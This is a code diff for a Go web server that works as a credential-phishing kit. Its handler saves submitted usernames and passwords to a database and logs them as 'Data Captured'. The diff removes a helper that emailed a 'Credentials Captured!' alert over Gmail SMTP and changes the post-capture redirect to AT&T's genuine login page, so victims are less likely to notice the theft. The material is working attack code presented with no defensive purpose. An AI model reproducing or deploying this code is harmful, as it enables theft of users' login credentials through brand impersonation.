@@ -6,7 +6,6 @@ import (
 	"html/template"
 	"log"
 	"net/http"
-	"net/smtp"
 
 	_ "github.com/go-sql-driver/mysql"
 )
@@ -37,7 +36,7 @@ func init() {
 func main() {
 	http.HandleFunc("/", index)
 	http.HandleFunc("/process", process)
-	log.Fatal(http.ListenAndServeTLS("10.0.0.32:443", "server.crt", "server.key", nil))
+	log.Fatal(http.ListenAndServeTLS("10.0.0.11:443", "server.crt", "server.key", nil))
 }
 
 func index(w http.ResponseWriter, r *http.Request) {
@@ -81,27 +80,7 @@ func process(w http.ResponseWriter, r *http.Request) {
 		}
 		insForm.Exec(user, pass)
 		log.Println("Data Captured!!!!!! " + "Username: " + user + " | Supersecret: " + pass)
-		email()
 	}
 	defer db.Close()
-	http.Redirect(w, r, "/", 301)
-}
-
-func email() {
-	auth := smtp.PlainAuth(
-		"",
-		"emailhere",
-		"passwordhere",
-		"smtp.gmail.com",
-	)
-	err := smtp.SendMail(
-		"smtp.gmail.com:587",
-		auth,
-		"emailhere",
-		[]string{""},
-		[]byte("Credentials Captured!"),
-	)
-	if err != nil {
-		log.Fatal(err)
-	}
+	http.Redirect(w, r, "https://www.att.com/my/#/login", 301)
 }
